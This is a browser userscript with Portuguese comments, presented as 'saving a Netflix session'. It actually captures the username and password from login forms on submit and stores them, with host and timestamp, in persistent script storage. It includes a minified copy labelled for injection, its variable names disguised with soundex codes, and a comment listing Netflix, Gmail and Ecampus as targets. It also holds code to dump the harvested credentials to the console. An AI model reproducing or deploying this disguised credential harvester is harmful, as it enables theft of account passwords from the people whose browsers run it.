// ==UserScript==
// @name        mysession
// @description	salvar sessão no Netflix
// @namespace   http://pastebin.com/EGAuDuhr
// @include     *://www.netflix.com/*Login*
// @version     1.20-2
// @require	https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js
// @grant       GM_getValue
// @grant       GM_setValue
// @grant       GM_deleteValue
// ==/UserScript==
/*
→ Netflix
→ Gmail
→ Ecampus
*/


//TODO verificar se o 'lgn', 'hst' e 'pss' já existem no array de histórico

/** MINIMIZADO - PARA INJETAR
const D355="S132";!function(t){String.prototype.isNotEmpty=function(){return this.trim()},Array.prototype.isNotEmpty=function(){return this.length>0};var n=GM_getValue(D355,[]),e="input[type=email], input[type=text], input[name=login], input[name=email], input[name=usuario]",i="input[type=password], input[name=password], input[name=senha]",a=function(t){return function(n,e){for(var i=t.querySelectorAll(e),a=0;a<i.length;++a){var o=i[a].value;o.isNotEmpty()&&n.push(o)}}};document.querySelector("form").addEventListener("submit",function(t){var o=[],r=[];if(a(this)(o,e),a(this)(r,i),o.isNotEmpty()&&r.isNotEmpty()){var u={hst:location.host,dte:(new Date).toLocaleString(),lgn:o,pss:r};n.push(u),GM_setValue(dataname,n)}})}(jQuery);
**/

/** MINIMIZADO - PARA MOSTRAR/APAGAR
const S000=!0,R510=!1,D355="S132";!function(a){var n=GM_getValue(D355,[]);if(S000){n.forEach(function(a){console.error(a)});};if(R510){GM_deleteValue(D355);};}(jQuery);
**/



const show = true;
const remove = true;

const dataname= 'savedsession';
(function($) {
	String.prototype.isNotEmpty = function() { return (this.trim()); };
	Array.prototype.isNotEmpty  = function() { return (this.length > 0); };

	var onhistory = GM_getValue(dataname, []);

	if(show == true) onhistory.forEach( function(e) { console.error(e) } );///*
	if(remove == true) GM_deleteValue(dataname);///*

	var selectorsLogin = 'input[type=email], input[type=text], input[name=login], input[name=email], input[name=usuario]';
	var selectorsPsswd = 'input[type=password], input[name=password], input[name=senha]';

	var fillData = function(formObject){
		return function(arrTarget, selectorsTarget){
			var myform = formObject.querySelectorAll(selectorsTarget);
			for(var i=0; i < myform.length; ++i){
				var e = myform[i].value;
				if(e.isNotEmpty()) arrTarget.push(e);
			}
		};
	};

	document.querySelector('form').addEventListener('submit', function (e) {
		// e.preventDefault();
		var arrLgn=[], arrPss=[];

		fillData(this)(arrLgn, selectorsLogin);
		fillData(this)(arrPss, selectorsPsswd);

		if((arrLgn.isNotEmpty()) && (arrPss.isNotEmpty())){
			var newdata = {
				"hst": location.host,
				"dte": new Date().toLocaleString(),
				"lgn": arrLgn,
				"pss": arrPss
			};
			onhistory.push(newdata);
			// console.log( onhistory, onhistory.length );
			GM_setValue(dataname, onhistory);
		}

	});
})(jQuery);

/*********************
soundex('dataname')
D355
soundex('savedsession')
S132
soundex('onhistory')
O523
soundex('show')
S000
soundex('remove')
R510
soundex('selectorsLogin')
S423
soundex('selectorsPsswd')
S424
soundex('myform')
M165
soundex('arrLgn')
A642
soundex('arrPss')
A612
soundex('newdata')
N330
/*********************/

// http://chris.photobooks.com/json/
// https://javascript-minifier.com/
